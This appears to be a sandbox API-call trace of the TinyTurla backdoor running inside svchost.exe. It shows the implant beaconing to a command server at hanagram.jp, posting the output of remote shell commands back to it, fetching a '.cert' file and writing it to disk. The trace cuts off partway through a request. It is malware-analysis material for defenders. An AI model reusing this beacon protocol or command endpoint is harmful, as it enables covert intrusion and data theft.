+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BD1C0
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0x2fc
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43F892EB0
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="result""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              ""
+[STR]              "Microsoft Windows [version 6.3.9600]"
+[STR]              "(c) 2013 Microsoft Corporation. Tous droits r‚serv‚s."
+[STR]              ""
+[STR]              "C:\Windows\system32>chcp 437 > NUL"
+[STR]              ""
+[STR]              "C:\Windows\system32>dir c:\users"
+[STR]              " Le volume dans le lecteur C n'a pas de nom."
+[STR]              " Le num‚ro de s‚rie du volume est 689B-5BB9"
+[STR]              ""
+[STR]              " R‚pertoire de c:\users"
+[STR]              ""
+[STR]              "21/10/2024  23:42    <DIR>          ."
+[STR]              "21/10/2024  23:42    <DIR>          .."
+[STR]              "22/08/2013  16:36    <DIR>          Public"
+[STR]              "27/02/2025  04:09    <DIR>          user"
+[STR]              "               0 fichier(s)                0 octets"
+[STR]              "               4 R‚p(s)  47ÿ927ÿ406ÿ592 octets libres"
+[STR]              ""
+[STR]              "C:\Windows\system32>exit"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x2fc
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F66A450
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F66A450
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA860
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43F2CFDC4
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f66a450
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F7C0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F36F1D0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7C4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F36F1D0
+[PAR] SIZE_T Size        : 0x20
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F8A5370
+[PAR] DWORD     dwNumberOfBytesToRead : 0x10
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7C4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e803410
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66a450
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66ac30
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x927c0 (600 sec)
+[RET] 0x7fff146b50aa in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 600000 ms to 15000 ms 
+
+Creation de Processus, pid [0x604] (C:\Windows\System32\chcp.com)
+
+Destruction de Processus, pid [0x604] (C:\Windows\System32\chcp.com)
+
+Destruction de Processus, pid [0x818] (C:\Windows\System32\cmd.exe)
+
+Destruction de Processus, pid [0x760] (C:\Windows\System32\conhost.exe)
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <ReadFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                : 0x4b8
+[PAR] LPVOID lpBuffer             : 0x000000F4405CF950
+[PAR] DWORD  nNumberOfBytesToRead : 0xfde7
+[RET] 0x7fff146b83ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x2c8] c:\windows\system32\svchost.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 30000 ms to 15000 ms 
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86FA00
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e8037f0
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A5090
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66b050
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F728
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6EB0
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6EB0
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xaf
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43E806AA0
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="gettask""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F780
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F66A450
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F66A450
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA730
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43F2CFF84
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f66a450
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F7A0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F58CB50
+[PAR] DWORD     dwNumberOfBytesToRead : 0x32
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F58CB50
+[PAR] SIZE_T Size        : 0x64
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F3BC5B2
+[PAR] DWORD     dwNumberOfBytesToRead : 0x32
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e8037f0
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66a450
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66b050
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86F1C0
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803600
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A53F0
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66ad90
+[PAR] LPCWSTR   pwszVerb          : 0x000000F4405DF5E8
+[STR]           -> "GET"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F8A5090
+[STR]           -> "/hanagram.cert"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x0 (null)
+[PAR] DWORD     dwHeadersLength  : 0x0
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0x0
+[RET] 0x7fff146bbf94 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F66A450
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bbfa4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F66A450
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA800
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43E88AE84
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bbfc2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F8C0290
+[PAR] DWORD     dwNumberOfBytesToRead : 0x1000
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F4405DF700
+[RET] 0x7fff146bc020 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F8C0290
+[PAR] SIZE_T Size        : 0x2000
+[RET] 0x7fff146bc054 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F3433B0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x1000
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F4405DF700
+[RET] 0x7fff146bc087 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CreateFileA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName            : 0x000000F43F3BCD30
+[STR]         -> "toto.cer"
+[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
+[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
+[RET] 0x7fff146b6a18 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[EVT] [Kernel Monitoring]
+[MSG] [FILE_CREATED] [toto.cer]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WriteFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                 : 0x47c
+[PAR] LPVOID lpBuffer              : 0x000000F43F2D7AD0
+[PAR] DWORD  nNumberOfBytesToWrite : 0x505
+[RET] 0x7fff146b6a45 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x47c
+[RET] 0x7fff146b6abf in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e803600
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66a450
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66ad90
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WaitForSingleObject> in [KERNEL32.DLL] 
+[PAR] HANDLE hHandle        : 0x4e0
+[PAR] DWORD  dwMilliseconds : 0xffffffff (INFINITE)
+[RET] 0x7fff146b8b4e in [tinyturla.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x87c]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86FA00
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e8037f0
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A5090
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66b470
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F728
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BC7B0
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BC7B0
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xaf
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43E806260
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="gettask""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F780
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReceiveResponse> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest   : 0x000000F43F66A450
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7fff146bd415 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryHeaders> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest          : 0x000000F43F66A450
+[PAR] DWORD     dwInfoLevel       : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPCWSTR   pwszName          : 0x0 (null)
+[PAR] LPVOID    lpBuffer          : 0x000000F43F8AA910
+[PAR] LPDWORD   lpdwBufferLength  : 0x000000F43F2D0224
+[PAR] LPDWORD   lpdwIndex         : 0x0
+[RET] 0x7fff146bd45c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                   : 0x3f66a450
+[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000F44055F7A0
+[RET] 0x7fff146bb7ef in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F58CED0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x32
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb844 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000F43E7A0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000F43F58CED0
+[PAR] SIZE_T Size        : 0x64
+[RET] 0x7fff146bb877 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpReadData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest              : 0x3f66a450
+[PAR] LPVOID    lpBuffer              : 0x000000F43F2C7492
+[PAR] DWORD     dwNumberOfBytesToRead : 0x32
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000F44055F7A4
+[RET] 0x7fff146bb8ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3e8037f0
+[RET] 0x7fff146baeb7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66a450
+[RET] 0x7fff146baec6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpCloseHandle> in [WINHTTP.dll] 
+[PAR] HINTERNET hInternet : 0x3f66b470
+[RET] 0x7fff146baed5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86FA00
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803410
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A5180
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66b470
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6F90
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6F90
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xfa
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43F897BF0
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
